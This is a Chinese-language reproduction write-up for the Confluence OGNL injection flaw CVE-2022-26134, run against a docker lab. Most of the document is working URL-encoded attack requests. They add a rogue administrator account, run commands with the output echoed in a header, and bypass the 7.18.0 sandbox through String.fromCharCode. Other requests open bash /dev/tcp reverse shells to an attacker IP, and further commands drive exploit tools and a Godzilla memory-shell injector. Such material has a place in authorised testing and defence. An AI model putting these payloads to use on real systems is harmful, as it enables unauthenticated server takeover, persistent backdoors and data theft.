# Atlassian Confluence 远程代码执行（CVE-2022-26134）
# 0x01 漏洞描述
近日，Atlassian官方发布了Confluence Server和Data Center OGNL 注入漏洞（CVE-2022-26134）的安全公告。该漏洞的CVSS评分为10分，目前漏洞细节与PoC已被公开披露，且被检测到存在在野利用。

Atlassian Confluence是Atlassian公司出品的专业wiki程序。攻击者可利用漏洞在未经身份验证的情况下，远程构造OGNL表达式进行注入，在Confluence Server或Data Center上执行任意代码。请相关用户尽快自检并采取措施进行防护。

Atlassian Confluence Server and Data Center 用于团队成员之间的协作和知识共享，主要部署在内网，所以互联网上分布较少，主要集中在美国、德国和荷兰。

# 0x02 影响范围
目前受影响的 Atlassian Confluence Server and Data Center 版本：
- Atlassian Confluence Server and Data Center < 7.4.17
- 7.5.0  ≤ Atlassian Confluence Server and Data Center < 7.13.7
- 7.14.0 ≤ Atlassian Confluence Server and Data Center < 7.14.3
- 7.15.0 ≤ Atlassian Confluence Server and Data Center < 7.15.2
- 7.16.0 ≤ Atlassian Confluence Server and Data Center < 7.16.4
- 7.17.0 ≤ Atlassian Confluence Server and Data Center < 7.17.4
- 7.18.0 ≤ Atlassian Confluence Server and Data Center < 7.18.1

# 0x03 环境搭建
## 3.1 Atlassian Confluence7.13.6
- https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2022-26134/README.zh-cn.md

## 3.2 Atlassian Confluence 7.18.0
- https://unsafe.sh/go-114183.html

docker-compose.yml:
```
version: '2'
services:
  web:
    image: atlassian/confluence-server:7.18.0-jdk11
    ports:
      - "8090:8090"
      - "5005:5005"
    depends_on:
      - db
  db:
    image: postgres:12.8-alpine
    environment: 
    - POSTGRES_PASSWORD=postgres
    - POSTGRES_DB=confluence
```
```
docker-compose up -d
```

# 0x04 漏洞复现
## 4.1 Atlassian Confluence7.13.6
### 1、无损检测

```
GET /%24%7B%40com.atlassian.confluence.util.GeneralUtil@setCookie(%22key%22,%22aaaaaaaa%22)%7D/ HTTP/1.1
Host: 192.168.50.227:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Length: 0


```

![image](https://user-images.githubusercontent.com/84888757/172954720-9d2d9190-3e80-4d6d-9cee-b9614a247dfa.png)

### 2、添加管理员用户

用户名`reidmu`，密码`reidmu@1234`
```
GET /%24%7B%23this.getUserAccessor().addUser('reidmu'%2C'reidmu%401234'%2C'reid%40reidmu.com'%2C'ReidMu'%2C%40com.atlassian.confluence.util.GeneralUtil%40splitCommaDelimitedString(%22confluence-administrators%2Cconfluence-users%22))%7D/ HTTP/1.1
Host: 192.168.50.227:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Length: 0


```

![image](https://user-images.githubusercontent.com/84888757/172954985-7f2946fc-96d8-478a-8eb9-b878e6bb7e43.png)

成功登录，数据库中已经成功添加管理员用户，数据库查询命令：
```
select u.id,u.user_name,u.active,u.credential from cwd_user u  join cwd_membership m on u.id=m.child_user_id join cwd_group g on m.parent_id=g.id join cwd_directory d on d.id=g.directory_id where g.group_name = 'confluence-administrators' and d.directory_name='Confluence Internal Directory';
```

![image](https://user-images.githubusercontent.com/84888757/172955044-e28509de-9b16-4f85-b1f4-b272408b67f6.png)


### 3、命令执行 - 手工
其中使用到的OGNL表达式为：
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}

经过URL编码后，构造GET请求数据包：

```
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: 192.168.50.227:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Length: 2


```

发送数据包，命令执行回显在X-Cmd-Response：

![image](https://user-images.githubusercontent.com/84888757/172955165-d090d6bc-e94f-4e7b-9a91-ca5291ae0988.png)

7.18.0 的payload在7.13.6一样能用
```
GET /%24%7BClass.forName(%22com.opensymphony.webwork.ServletActionContext%22).getMethod(%22getResponse%22%2Cnull).invoke(null%2Cnull).setHeader(%22X-CMD%22%2CClass.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22nashorn%22).eval(%22eval(String.fromCharCode(118%2C97%2C114%2C32%2C115%2C61%2C39%2C39%2C59%2C118%2C97%2C114%2C32%2C112%2C112%2C32%2C61%2C32%2C106%2C97%2C118%2C97%2C46%2C108%2C97%2C110%2C103%2C46%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C46%2C103%2C101%2C116%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C40%2C41%2C46%2C101%2C120%2C101%2C99%2C40%2C39%2C105%2C100%2C39%2C41%2C46%2C103%2C101%2C116%2C73%2C110%2C112%2C117%2C116%2C83%2C116%2C114%2C101%2C97%2C109%2C40%2C41%2C59%2C119%2C104%2C105%2C108%2C101%2C32%2C40%2C49%2C41%2C32%2C123%2C118%2C97%2C114%2C32%2C98%2C32%2C61%2C32%2C112%2C112%2C46%2C114%2C101%2C97%2C100%2C40%2C41%2C59%2C105%2C102%2C32%2C40%2C98%2C32%2C61%2C61%2C32%2C45%2C49%2C41%2C32%2C123%2C98%2C114%2C101%2C97%2C107%2C59%2C125%2C115%2C61%2C115%2C43%2C83%2C116%2C114%2C105%2C110%2C103%2C46%2C102%2C114%2C111%2C109%2C67%2C104%2C97%2C114%2C67%2C111%2C100%2C101%2C40%2C98%2C41%2C125%2C59%2C115))%22))%7D/ HTTP/1.1
Host: 192.168.50.227:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Length: 0


```

### 4、getshell
#### 1）手工
```
GET /%24%7BClass.forName(%22com.opensymphony.webwork.ServletActionContext%22).getMethod(%22getResponse%22,null).invoke(null,null).setHeader(%22ok%22,Class.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22nashorn%22).eval(%22new%20java.lang.ProcessBuilder().command('bash','-c','bash%20-i%20%3E&%20/dev/tcp/192.168.50.53/6666%200%3E&1').start()%22))%7D/ HTTP/1.1
Host: 192.168.50.227:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Length: 0


```
🚩 这里的正斜杠不能再URL编码了，原因：服务端自动URL解码的时候，不会去解码正斜杠。而P神在 `Confluence 7.18.0` 构造的payload可以全部url编码是因为，它多了一层`String.fromCharCode`

![image](https://user-images.githubusercontent.com/84888757/172955540-b6bd22ed-a1a5-442d-ac96-4a52da936d14.png)

#### 2）工具反弹shell -  through_the_wire.py
- 🔗 https://github.com/jbaines-r7/through_the_wire

```
python3 through_the_wire.py --rhost 192.168.50.227 --rport 8090 --lhost 192.168.50.53 --protocol http:// --reverse-shell
```

![image](https://user-images.githubusercontent.com/84888757/172955662-9db239be-2718-4276-98c6-8d43b50349f0.png)

#### 3）工具反弹shell - cmd_reverse.py
- 🔗 [cmd_reverse.py来源](https://mp.weixin.qq.com/s?__biz=MzI2Mjc5NjQ0OA==&mid=2247484931&idx=1&sn=7e0ba8b91cf19196c192e3d8007baf70)

```
python3 cmd_reverse.py -u http://192.168.50.227:8090/ -i 攻击方ip -p 4321
```

![image](https://user-images.githubusercontent.com/84888757/172955883-e869b6ad-3a14-44fa-950c-b2d7aff8e781.png)

### 5、内存马
- 🔗 https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL

```
java -jar CVE-2022-26134.jar http://192.168.50.227:8090/ 哥斯拉密码 哥斯拉密钥
```

![image](https://user-images.githubusercontent.com/84888757/172956037-42c4f130-66db-41ac-9597-1b352866a4be.png)

如果内存Shell已经注入成功但哥斯拉无法连接,请在请求配置添加以下协议头或者为哥斯拉配置Burp代理

```
Connection: close
```

![image](https://user-images.githubusercontent.com/84888757/172956100-c51bba3f-6898-4e9f-988e-6b411594ca0a.png)

![image](https://user-images.githubusercontent.com/84888757/172956114-cd0d465f-b87d-4405-95d0-0067e3da561f.png)


## 4.2 Atlassian Confluence 7.18.0

网上现在已经公开的一些利用方式只针对 v7.14 及以下系列有效，因为从 v7.15 系列开始，Confluence 在 OGNL 表达式解析时加入了沙箱设置。

### 1、无损检测

```
GET /%24%7B%40com.atlassian.confluence.util.GeneralUtil@setCookie(%22key%22,%22aaaaaaaa%22)%7D/ HTTP/1.1
Host: 192.168.50.227:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Length: 0


```

![image](https://user-images.githubusercontent.com/84888757/172956469-20e8c8e4-1b6c-46b2-9660-e75cee48f603.png)

### 2、添加管理员用户
用户名httpvoid，密码pwn@1234

```
GET /%24%7B%23this.getUserAccessor().addUser('httpvoid'%2C'pwn%401234'%2C'pwn%40httpvoid.com'%2C'HttpVoid'%2C%40com.atlassian.confluence.util.GeneralUtil%40splitCommaDelimitedString(%22confluence-administrators%2Cconfluence-users%22))%7D/ HTTP/1.1
Host: 192.168.50.227:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Length: 0


```

![image](https://user-images.githubusercontent.com/84888757/172956655-be162a6b-f7c6-4e8b-a5a8-a995a50d857e.png)

成功登录，数据库中已经成功添加管理员用户。

![image](https://user-images.githubusercontent.com/84888757/172956724-68e41c7e-843f-40c6-9f22-e943e967521c.png)

### 3、命令执行
- 来自p神

网上流传的POC没法打最新版7.18.0，因为增加了沙箱。

通过下面这个POC即可执行命令并获取回显：
```
${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("X-CMD",Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("eval(String.fromCharCode(118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,105,100,39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115))"))}
```

在burp中用url编码，数据包如下：
```
GET /%24%7BClass.forName(%22com.opensymphony.webwork.ServletActionContext%22).getMethod(%22getResponse%22%2Cnull).invoke(null%2Cnull).setHeader(%22X-CMD%22%2CClass.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22nashorn%22).eval(%22eval(String.fromCharCode(118%2C97%2C114%2C32%2C115%2C61%2C39%2C39%2C59%2C118%2C97%2C114%2C32%2C112%2C112%2C32%2C61%2C32%2C106%2C97%2C118%2C97%2C46%2C108%2C97%2C110%2C103%2C46%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C46%2C103%2C101%2C116%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C40%2C41%2C46%2C101%2C120%2C101%2C99%2C40%2C39%2C105%2C100%2C39%2C41%2C46%2C103%2C101%2C116%2C73%2C110%2C112%2C117%2C116%2C83%2C116%2C114%2C101%2C97%2C109%2C40%2C41%2C59%2C119%2C104%2C105%2C108%2C101%2C32%2C40%2C49%2C41%2C32%2C123%2C118%2C97%2C114%2C32%2C98%2C32%2C61%2C32%2C112%2C112%2C46%2C114%2C101%2C97%2C100%2C40%2C41%2C59%2C105%2C102%2C32%2C40%2C98%2C32%2C61%2C61%2C32%2C45%2C49%2C41%2C32%2C123%2C98%2C114%2C101%2C97%2C107%2C59%2C125%2C115%2C61%2C115%2C43%2C83%2C116%2C114%2C105%2C110%2C103%2C46%2C102%2C114%2C111%2C109%2C67%2C104%2C97%2C114%2C67%2C111%2C100%2C101%2C40%2C98%2C41%2C125%2C59%2C115))%22))%7D/ HTTP/1.1
Host: cf2.infomc.com
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close


```

上面执行了id命令，这个payload怎么改呢？
将
```
String.fromCharCode(118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,105,100,39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115)
```
放到hackbar里

![image](https://user-images.githubusercontent.com/84888757/172957145-fadd8852-c6ea-4ce2-beb8-c03be19ac025.png)

将对应命令改了，再进行String.fromCharCode encode

![image](https://user-images.githubusercontent.com/84888757/172957163-1abe7a91-e02f-42fa-a8f2-68daf9d20342.png)



再替换payload里相应的部分就好了

![image](https://user-images.githubusercontent.com/84888757/172957181-3b07f616-d1f8-40b4-af30-45889ebdcb3b.png)

### 4、getshell
#### 1）手工反弹shell
```
GET /%24%7BClass.forName(%22com.opensymphony.webwork.ServletActionContext%22).getMethod(%22getResponse%22,null).invoke(null,null).setHeader(%22ok%22,Class.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22nashorn%22).eval(%22new%20java.lang.ProcessBuilder().command('bash','-c','bash%20-i%20%3E&%20/dev/tcp/192.168.50.53/6666%200%3E&1').start()%22))%7D/ HTTP/1.1
Host: 192.168.50.227:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Length: 0


```

![image](https://user-images.githubusercontent.com/84888757/172957244-b9643702-c61e-4f14-b36e-5bd12482f895.png)

#### 2）工具反弹shell - through_the_wire.py
- 🔗 https://github.com/jbaines-r7/through_the_wire

```
python3 through_the_wire.py --rhost 靶机ip --rport 8090 --lhost 攻击方ip --protocol http:// --reverse-shell
```

![image](https://user-images.githubusercontent.com/84888757/172957533-281a6cc3-4678-4f84-8a8c-3dbd5539bf50.png)

# 0x05 参考链接
- [Atlassian Confluence 7.18.0 环境搭建及分析](https://unsafe.sh/go-114183.html)
- [Confluence(CVE-2022-26134) OGNL表达式注入RCE 漏洞复现](https://mp.weixin.qq.com/s?__biz=MzI2Mjc5NjQ0OA==&mid=2247484931&idx=1&sn=7e0ba8b91cf19196c192e3d8007baf70)
- [through_the_wire.py直接获取shell](https://github.com/jbaines-r7/through_the_wire)
- [内存马](https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL)
- [修复建议](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247496215&idx=1&sn=cd02fb80963e513ef0dcdd81dc9b9f9e&chksm=fe79d68fc90e5f998feb784a1c0c636c73e197f6856f03bdd6335f37826b76e3597c35ab96dd&mpshare=1&scene=23&srcid=0604glMroDj0s22KM1tQWoKX&sharer_sharetime=1654320757846&sharer_shareid=7e8b01431dedfcdb117a6eb003481bb5#rd)

